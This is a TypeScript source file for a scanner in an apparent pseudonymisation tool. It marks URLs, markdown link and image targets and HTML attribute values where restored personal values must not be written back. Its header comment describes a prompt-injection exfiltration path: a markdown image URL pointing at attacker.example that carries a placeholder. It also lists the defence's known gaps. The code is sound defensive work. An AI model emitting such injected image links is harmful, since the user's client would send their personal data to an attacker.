// Regions of text where a restored value must not be written back
// (restoration safety, CLAUDE.md): URLs, markdown link/image targets, and
// HTML attribute values (including `mailto:`). The concrete attack this
// defends against: injected text makes the model output
// `![x](https://attacker.example/?d=[AADHAAR_1])`; if Pseudonym restored the
// real value there, the user's own client would leak it fetching the image
// when it renders the answer. This is not a defence against prompt
// injection in general - only this one exfiltration path - and the
// README/threat model must say so.
//
// A left-to-right scanner, not regular expressions (ADR-018). Streaming
// restoration has to decide about a placeholder before the rest of the
// answer exists, so every rule here is decided by the text on the left: a
// character is inside a region, or not, the moment it arrives. (The only
// exceptions are a URL's scheme and a bare URL's host, which are marked once
// the "://" or "/" after them arrives; a placeholder can never be part of
// either, see ADR-018.) The scanner does a fixed amount of work per
// character, so a whole answer takes linear time (bug-log 16).
//
// The rules. Pattern matching, not a URL/HTML/markdown parser, so it leans
// towards marking too much:
//  - Markdown destinations, after every "](" (inline links and images) and
//    every "[label]:" (reference definitions, which an image uses as
//    `![x][label]`; bug-log 14), then optional whitespace, line breaks
//    included: either `<…` up to and including ">", or to the end of the
//    line if there is none; or a run of non-whitespace. A run of
//    non-whitespace, not "up to the first ')'": CommonMark allows balanced
//    parentheses in a destination (bug-log 13). Every "](" and "[" counts,
//    even inside an earlier destination. Reference labels are not anchored
//    to the start of a line, so definitions inside block quotes and list
//    items are covered; the cost is that the token after any "[…]:" in
//    prose is left unrestored.
//  - Quoted HTML attribute values: "=", optional whitespace, then a quote;
//    the value runs to the matching quote, or to the end of the text if it
//    never closes. Read left to right, so an "=" inside an open value does
//    not start another one (`?ref="` ending a URL must not turn the rest of
//    the answer into a value).
//  - Scheme URLs (`https://…`, `mailto:…`), then any run of characters
//    that are not whitespace, `<>()"'`.
//  - Bare hosts with a path (`a.example/…`), the same run after the "/".
//  - Not here, because it is about the placeholder, not the text around
//    it: the host rule in `startsHost` below.
// Known gaps, all outside the automatic image-fetch path (see the Phase 8
// threat-model notes in CLAUDE.md):
//  - a bare host with no scheme and no "/" (`a.example?d=…`), and a bare IP
//    address with no scheme (`203.0.113.9/?d=…`), in plain text: a client
//    fetches neither on its own; a user would have to click a linkified one;
//  - an unquoted HTML attribute that does not look like a URL
//    (`<img src=a.example?d=…>` is relative to the client's own site);
//  - a value glued to the end of a host label in plain text
//    (`x-[CARD_1].example/`);
//  - an HTML attribute whose value is not a URL at all is still marked
//    unsafe (any quoted value), the safe side.

import type { Span } from '../detection/normalise.js';

const TAB = 0x09;
const LF = 0x0a;
const CR = 0x0d;
const DQUOTE = 0x22;
const SQUOTE = 0x27;
const LPAREN = 0x28;
const RPAREN = 0x29;
const PLUS = 0x2b;
const HYPHEN = 0x2d;
const DOT = 0x2e;
const SLASH = 0x2f;
const COLON = 0x3a;
const LT = 0x3c;
const EQUALS = 0x3d;
const GT = 0x3e;
const LBRACKET = 0x5b;
const BACKSLASH = 0x5c;
const RBRACKET = 0x5d;
const UNDERSCORE = 0x5f;

/** Exactly the code units JavaScript's `\s` matches. */
export function isWhitespace(c: number): boolean {
  if (c <= 0x20) return c === 0x20 || (c >= TAB && c <= CR);
  if (c < 0xa0) return false;
  return (
    c === 0xa0 ||
    c === 0x1680 ||
    (c >= 0x2000 && c <= 0x200a) ||
    c === 0x2028 ||
    c === 0x2029 ||
    c === 0x202f ||
    c === 0x205f ||
    c === 0x3000 ||
    c === 0xfeff
  );
}

const isAsciiLetter = (c: number): boolean => (c >= 0x41 && c <= 0x5a) || (c >= 0x61 && c <= 0x7a);
const isAsciiDigit = (c: number): boolean => c >= 0x30 && c <= 0x39;
const isAsciiAlnum = (c: number): boolean => isAsciiLetter(c) || isAsciiDigit(c);
/** A word character for `\b`, which is ASCII-only in these rules. */
const isAsciiWord = (c: number): boolean => isAsciiAlnum(c) || c === UNDERSCORE;
const isSchemeChar = (c: number): boolean =>
  isAsciiAlnum(c) || c === PLUS || c === DOT || c === HYPHEN;
const isUrlChar = (c: number): boolean =>
  !isWhitespace(c) &&
  c !== LT &&
  c !== GT &&
  c !== LPAREN &&
  c !== RPAREN &&
  c !== DQUOTE &&
  c !== SQUOTE;
/** What `.` in a regular expression does not match. */
const isLineTerminator = (c: number): boolean =>
  c === LF || c === CR || c === 0x2028 || c === 0x2029;

const MAILTO = 'mailto';

/**
 * Finds unsafe regions in text fed to it piece by piece. Feeding a text in
 * any number of pieces gives the same regions as feeding it whole.
 */
export class UnsafeRegionScanner {
  /** Merged, sorted, never overlapping. */
  readonly #regions: { start: number; end: number }[] = [];
  #position = 0;
  #previous = -1;

  // Markdown destinations, shared by "](" and "[label]:" (one grammar).
  #destinationPending = false;
  #destinationPlain = false;
  #destinationAngle = false;
  // Reference labels.
  #labelOpen = false;
  #labelNonEmpty = false;
  #labelEscape = false;
  #labelClosed = false;
  // Quoted HTML attribute values.
  #equalsPending = false;
  #quote = 0;
  // Scheme URLs.
  #schemeAnchor = -1;
  #schemeStart = -1;
  #schemeStep = 0;
  #mailtoMatched = 0;
  #mailtoStart = -1;
  #url = false;
  // Bare hosts: the chain of valid labels so far, and the current label.
  #hostChain = -1;
  #labelStart = 0;
  #labelAnchor = -1;
  #labelEndsAlnum = false;
  #labelAllLetters = true;
  #labelLength = 0;
  #path = false;

  feed(text: string): void {
    for (let i = 0; i < text.length; i++) this.#step(text.charCodeAt(i));
  }

  /** True if `[start, end)` overlaps a region found so far. */
  overlaps(start: number, end: number): boolean {
    for (let i = this.#regions.length - 1; i >= 0; i--) {
      const region = this.#regions[i]!;
      if (region.end <= start) return false;
      if (region.start < end) return true;
    }
    return false;
  }

  /** Every region found so far. */
  regions(): Span[] {
    return this.#regions.map((region) => ({ ...region }));
  }

  #mark(start: number, end: number): void {
    let last = this.#regions.at(-1);
    while (last && last.end >= start) {
      start = Math.min(start, last.start);
      end = Math.max(end, last.end);
      this.#regions.pop();
      last = this.#regions.at(-1);
    }
    this.#regions.push({ start, end });
  }

  #step(c: number): void {
    const position = this.#position;
    const previous = this.#previous;
    let unsafe = false;

    // Markdown destinations.
    if (this.#destinationAngle) {
      if (c === LF) this.#destinationAngle = false;
      else {
        unsafe = true;
        if (c === GT) this.#destinationAngle = false;
      }
    }
    if (this.#destinationPlain) {
      if (isWhitespace(c)) this.#destinationPlain = false;
      else unsafe = true;
    }
    if (this.#destinationPending && !isWhitespace(c)) {
      this.#destinationPending = false;
      unsafe = true;
      if (c === LT) this.#destinationAngle = true;
      else this.#destinationPlain = true;
    }
    if (c === LPAREN && previous === RBRACKET) this.#destinationPending = true;

    // Reference labels: "[", at least one character (a backslash escapes
    // the next one; no "]" and no line break otherwise), "]", ":".
    if (this.#labelClosed) {
      this.#labelClosed = false;
      if (c === COLON) this.#destinationPending = true;
    }
    if (this.#labelOpen) {
      if (this.#labelEscape) {
        this.#labelEscape = false;
        if (isLineTerminator(c)) this.#labelOpen = false;
        else this.#labelNonEmpty = true;
      } else if (c === BACKSLASH) this.#labelEscape = true;
      else if (c === RBRACKET) {
        this.#labelOpen = false;
        this.#labelClosed = this.#labelNonEmpty;
      } else if (c === LF) this.#labelOpen = false;
      else this.#labelNonEmpty = true;
    }
    // Every "[" starts a label. One already open keeps its state: it is the
    // oldest, so the longest, and all open labels end at the same "]".
    if (c === LBRACKET && !this.#labelOpen) {
      this.#labelOpen = true;
      this.#labelNonEmpty = false;
      this.#labelEscape = false;
    }

    // Quoted HTML attribute values, left to right.
    if (this.#quote !== 0) {
      if (c === this.#quote) this.#quote = 0;
      else unsafe = true;
    } else if (this.#equalsPending && (c === DQUOTE || c === SQUOTE)) {
      this.#quote = c;
      this.#equalsPending = false;
    } else if (!isWhitespace(c)) this.#equalsPending = c === EQUALS;

    // Scheme URLs. The scheme must start at a word boundary with a letter.
    if (this.#url) {
      if (isUrlChar(c)) unsafe = true;
      else this.#url = false;
    }
    const schemeStep = this.#schemeStep;
    this.#schemeStep = 0;
    const urlStart = schemeStep === 3 ? this.#schemeStart : this.#mailtoStart;
    if (urlStart >= 0 && isUrlChar(c)) {
      this.#mark(urlStart, position);
      this.#url = true;
      unsafe = true;
    }
    this.#mailtoStart = -1;
    if (c === SLASH && (schemeStep === 1 || schemeStep === 2)) this.#schemeStep = schemeStep + 1;
    if (isSchemeChar(c)) {
      if (this.#schemeAnchor < 0 && isAsciiLetter(c) && !isAsciiWord(previous)) {
        this.#schemeAnchor = position;
      }
    } else {
      if (c === COLON && this.#schemeAnchor >= 0) {
        this.#schemeStep = 1;
        this.#schemeStart = this.#schemeAnchor;
      }
      this.#schemeAnchor = -1;
    }
    if (c === COLON && this.#mailtoMatched === MAILTO.length) {
      this.#mailtoStart = position - MAILTO.length;
    }
    if (this.#mailtoMatched < MAILTO.length && c === MAILTO.charCodeAt(this.#mailtoMatched)) {
      this.#mailtoMatched =
        this.#mailtoMatched > 0 || !isAsciiWord(previous) ? this.#mailtoMatched + 1 : 0;
    } else {
      // An "m" here can never restart the match: the character before it
      // is a letter of "mailto", so there is no word boundary.
      this.#mailtoMatched = 0;
    }

    // Bare hosts: one or more labels, each followed by ".", then a top-level
    // domain of two or more letters, then "/". The first label starts at a
    // word boundary; the "/" and the path after it are the region, and the
    // host is marked when the "/" arrives.
    if (this.#path) {
      if (isUrlChar(c)) unsafe = true;
      else this.#path = false;
    }
    if (isAsciiAlnum(c) || c === HYPHEN) {
      if (this.#labelAnchor < 0 && isAsciiAlnum(c) && !isAsciiWord(previous)) {
        this.#labelAnchor = position;
      }
      this.#labelEndsAlnum = isAsciiAlnum(c);
      this.#labelAllLetters &&= isAsciiLetter(c);
      this.#labelLength++;
    } else if (c === DOT) {
      if (this.#labelAnchor < 0 || !this.#labelEndsAlnum) this.#hostChain = -1;
      else if (this.#hostChain < 0 || this.#labelAnchor !== this.#labelStart) {
        this.#hostChain = this.#labelAnchor;
      }
      this.#startLabel(position + 1);
    } else {
      if (c === SLASH && this.#hostChain >= 0 && this.#labelAllLetters && this.#labelLength >= 2) {
        this.#mark(this.#hostChain, position);
        this.#path = true;
        unsafe = true;
      }
      this.#hostChain = -1;
      this.#startLabel(position + 1);
    }

    if (unsafe) this.#mark(position, position + 1);
    this.#previous = c;
    this.#position = position + 1;
  }

  #startLabel(start: number): void {
    this.#labelStart = start;
    this.#labelAnchor = -1;
    this.#labelEndsAlnum = false;
    this.#labelAllLetters = true;
    this.#labelLength = 0;
  }
}

/** Every unsafe region in `text`, sorted by start, merged, never overlapping. */
export function unsafeRegions(text: string): Span[] {
  const scanner = new UnsafeRegionScanner();
  scanner.feed(text);
  return scanner.regions();
}

/** True if `[start, end)` overlaps any region (`regions` need not be sorted). */
export function isInUnsafeRegion(regions: readonly Span[], start: number, end: number): boolean {
  return regions.some((region) => region.start < end && start < region.end);
}

/**
 * The host rule (ADR-018): a placeholder followed by text that would make
 * its restored value the first label of a hostname
 * (`CARD_1.attacker.example/`) stays unrestored. `after` is the text right
 * after the placeholder; only its first two characters matter. A bare form
 * counts after "." or "-"; a bracketed one only after ".", since
 * `[PAN_1]-linked` is ordinary prose.
 */
export function startsHost(after: string, bracketed: boolean): boolean {
  const first = after.charCodeAt(0);
  const second = after.charCodeAt(1);
  const label = isAsciiAlnum(second) || second === HYPHEN;
  return label && (first === DOT || (!bracketed && first === HYPHEN));
}
